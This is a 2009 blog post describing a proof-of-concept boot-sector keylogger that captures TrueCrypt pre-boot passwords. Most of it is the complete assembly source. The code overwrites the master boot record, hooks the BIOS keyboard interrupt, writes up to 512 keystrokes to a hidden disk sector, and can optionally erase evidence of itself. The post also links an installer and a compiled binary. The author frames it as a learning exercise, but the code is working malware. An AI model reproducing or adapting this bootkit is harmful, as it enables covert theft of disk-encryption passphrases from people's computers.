<div>
Original Post: <a href="https://www.castledragmire.com/Posts/BIOS_Level_Key_Logger">BIOS Level Key Logger</a><br>
Date: 2009-10-31<br>
SubTitle: More Boot Loader Fun<br>
Tags: Boot Loader, Key Logger, Security, TrueCrypt<br><br>

<p>So I decided to play around more with <a href="../2009-10-25%20-%20My%20New%20Boot%20Loader">boot loaders</a> for a bit of fun and learning. I couldn’t come up with a good project to do, so I defaulted on writing a proof of concept for a <a href="https://www.castledragmire.com/Posts/Truecrypt_5.0_tribulations">TrueCrypt pre-boot authenticated volume</a> <a href="http://en.wikipedia.org/wiki/Keystroke_logging">key logger</a> (again, see my last <a href="../2009-10-25%20-%20My%20New%20Boot%20Loader">Boot Loaders</a> post for more information).</p>
<p>Unfortunately, the key logger stops working once XP boots, and I’m not completely sure why yet. <span class=ToggleText>[reason]</span><span class=HideText>I think it has to do something with Windows using an Interrupt Descriptor Table instead of the Interrupt Vector Table, or overwriting the Interrupt Vector Table entry without calling the previous value.</span> I may try and get it working for Windows (or any operating system) later, but I accomplished what I wanted to with this, so am not going to worry about it for now.</p>
<p>This is also just a proof of concept, so it isn’t full proof. It only records the first 512 keystrokes before Windows loads, and it also might not be easy to install without some knowledge of how it works.</p><br>

<p>I am providing an example <a href="InstallBoot.pl">installer</a> in Perl which writes to a <a href="http://en.wikipedia.org/wiki/Vmware">VMWare</a> hard drive. It can easily be modify though to install to a real hard drive using either a boot loader, or when running Windows through <i>CreateFile</i> with the hard drive (requires administrative privileges).</p>
<b>Installing works as follows</b>:
<ul>
	<li>Copies the original boot loader sector (#0 of a hard drive) to an unused sector (In this case, #61 of the hard drive, which is the last unused sector by Truecrypt [Sector 62 contains the encryption key, and sector 63 is the first partition table] ).</li>
	<li>Installs the compiled code to the boot loader sector.</li>
</ul><br>

Once installed, the <a href="BootKeyLoggerv1.0.asm">key logger (v1.0 source)</a> <a href="BootKeyLoggerv1.0.raw">[v1.0 compiled binary]</a> boot loader works as follows:
<ul>
	<li>When the computer boots to the medium (hard drive, flash drive, CD, etc) with the installed code, it immediately runs the key logger installer.</li>
	<li>It first copies itself from the boot loader location in memory (0x7C00) to a new location, and the original boot loader is loaded into the boot memory location to be run later, unaware that it wasn’t the first thing to load.</li>
	<li>If requested (this is an option set by a variable), the key logger installer removes itself from the hard drive, erasing evidence of it ever being there. This means the key logger will only run from memory after the first time the machine is booted. This is not turned on by default.</li>
	<li>It then installs a <a href="http://en.wikipedia.org/wiki/BIOS_interrupt_call">BIOS interrupt</a> <a href="http://en.wikipedia.org/wiki/Hooking">hook</a> on the keyboard interrupt (0x9) to call the key logger.</li>
	<li>The final step is to execute the original boot loader which is now at the boot loader location in memory.</li>
</ul><br>

The key logger works as follows:
<ul>
	<li>When a key is pressed, the key logger code is called.</li>
	<li>It first calls the original interrupt 0x9 keyboard handling code.</li>
	<li>It then gets the last pressed key(s) from the bios keyboard buffer and saves them to the key logger save buffer (either as their ASCII character, or as their key code).</li>
	<li>The save buffer is then written to a predefined location on the hard drive before the interrupt is returned as completed.</li>
	<li>Currently, the key logger only records up to 512 keystrokes to a single hard drive sector.</li>
</ul><br>

The assembly code for the key logger is as follows:
</div>

```asm
;Copyright 2009 by Dakusan (http://www.castledragmire.com/Copyright)
;This is a boot loader keylogger (does not work once Windows XP loads)
;See http://www.castledragmire.com/Posts/BIOS_Level_Key_Logger for more information

ORG 0x7C00 ;Origin location

;Constants
Start:					;Where the program starts (0x7C00)
SectorSize equ 0x200		;Size of a sector (and the boot loader)

;User defined constants
	;Memory mappings
	NewStart equ Start+SectorSize				;Where the boot loader will be copied to in memory for execution
	WhereToRecord equ Start+SectorSize*2 	;Where to record key strokes in memory (the save buffer)

	;Hard drive mappings
	WriteSector equ 60				;The hard drive sector to write the last logged 512 keys too. Needs to be <63. This can be the same as "OriginalBootLoaderSector" if "EraseEvidence" is true
	OriginalBootLoaderSector equ 61	;The hard drive sector the original boot loader is written to
	EraseEvidence equ 0				;Boolean dictating whether to restore the original boot loader and clear out where it was copied

;More constants
CodeOffset equ NewStart-Start		;The code is actually offset this amount when copied to the new memory location

;Set up needed segment registers to point to 0
xor ax,ax
mov ds,ax
mov es,ax

;Copy this loaded boot loader to new location in memory and execute there
mov cx,SectorSize
mov si,Start
mov di,NewStart
rep movsb
db 0xe9								;Jump to...
dw CodeOffset						;...Location where code is moved to

;Copy the original boot loader from the hard drive back to the boot address in memory
mov ah,2							;Read instruction
mov dl,0x80							;Drive #0 (0x80-x)
mov al,1								;1 sector
xor dh,dh							;Head #0
xor ch,ch							;Track #0
mov cl,OriginalBootLoaderSector+1	;Sector to read from
mov bx,Start							;Memory location to write to
int 0x13								;BIOS drive function

;Zero out the save buffer
mov cx,SectorSize
mov di,WhereToRecord
xor al,al
rep stosb

;Erase this boot loader if requested by returning the hard drive's boot loader to its original state and clearing out its copy at OriginalBootLoaderSector
or al,EraseEvidence					;Check to see if user wants to erase the evidence (al=0 before this operation)
jz SkipEraseEvidence					;If false, do not do so
mov bx,Start							;The buffer to write (which is now the original boot loader)
mov cl,0+1							;Write to the first sector
call WriteToDrive						;Do the write to restore the original boot loader
mov bx,WhereToRecord				;The save buffer, which is zeroed out
mov cl,OriginalBootLoaderSector+1	;Write to where the original boot loader was stored
call WriteToDrive						;Do the write to erase the backup of the original boot loader
SkipEraseEvidence:

;Hook the keyboard interrupt
cli												;Disable interrupts
mov eax, [es:0x9*4]								;Grab the origial handler. Source=IDT::INT9. From Wikipedia: The IDT [Interrupt descriptor (Vector) table] "resides at a fixed location in memory from address 0x0000 to 0x03ff, and consists of 256 four-byte real mode pointers"
mov [es:OriginalInt9Handler+CodeOffset], eax		;And save it for later use
mov dword [es:0x9*4], Int9Hook+CodeOffset		;Install INT 9 filter
sti												;Enable interrupts

;An infinite test loop that will output typed characters to the screen, and never go to the original boot loader
;GetKeys:
;mov ah,0
;int 0x16
;mov ah,0xe ;Write ascii character to screen
;int 0x10
;cmp al,0xA
;jne GetKeys

;Execute the original boot loader
db 0xe9									;Jump to...
dw -CodeOffset-($-Start)-2				;...Original start, which now contains the original boot loader

;Keyboard hook
Int9Hook:
	pushf								;Since the original int handler will call iret, we need to push an extra layer of interrupt info on the stack
	DB 9Ah								;CALL FAR PROC SEGMENT:OFFSET
		OriginalInt9Handler dd 0			;The original Interrupt 9 handler (in segment:offset format [ror 16])

	;Save registers and zero out es
	pusha
	xor bx,bx
	mov es,bx

	;Get the character we are currently on in the save buffer, and if >512, do not record
	mov di,[es:CharacterOn+CodeOffset]	;di=The character we are currently on
	cmp di,512
	jge SkipInt9

	;Loop through the keyboard buffer
	mov esi,[es:0x41A]					;40:1A=Offset from 40:00 to keyboard buffer head, 40:1C=Offset from 40:00 to keyboard buffer tail
	add esi,0x04000400					;Beginning and end +=0x400, si=keyboard buffer head
	mov ecx,esi
	shr ecx,16							;cx=keyboard buffer tail
	mov bx,0x41E						;bx=The beginning of the keyboard buffer
	cmp si,cx							;Check if there are no characters to write (head==tail)
	je SkipInt9							;If there are no keys to write, jump to end
	WriteKey:							;Save a single keyboard character to our save buffer.
		;Save the character
		mov al,[es:si]					;Fetch the character, use es:si+1 to save the scancode instead
		mov [es:di+WhereToRecord],al	;Save the character
		;Update where we are in the save buffer and make sure we are not at the end (>512)
		inc di							;Update where we are in the buffer
		cmp di,512
		jge FinishedKeyboardBuffer

		;Move to the next character in the keyboard buffer and if we are not at the end, write the next character
		add si,2							;Move to the next character in the keyboard buffer
		cmp si,0x43E					;If we have exceeded the keyboad buffer length...
		cmovge si,bx						;...loop back to the beginning
		cmp si,cx						;If there are still more characters to write (head<tail)
		jl WriteKey						;Write the next character
	FinishedKeyboardBuffer:

	mov [es:CharacterOn+CodeOffset],di	;Update where we are in the save buffer

	;Write the updated keylogger to the harddrive
	mov cl,WriteSector+1					;Sector to write to
	mov bx,WhereToRecord
	call WriteToDrive

	;Clean up from the interrupt
	SkipInt9:
	popa
	iret

;Write to drive function. Parameters: es:bx=Buffer, cl:Sector to write
WriteToDrive:
mov ah,3			;Write instruction
mov dl,0x80			;Drive #0 (0x80-x)
mov al,1				;1 sector
xor dh,dh			;Head #0
xor ch,ch			;Track #0
int 0x13				;BIOS drive function
ret					;Return from function

;Variables
CharacterOn dw 0	;What character we are on in the character buffer

;Fill out up to 0x1BE, where the partition information starts, with 0s. This cleans up unused information
times 0x1BE-($-$$) db 0 ;Fill the rest with zeros
```

<div>
</div>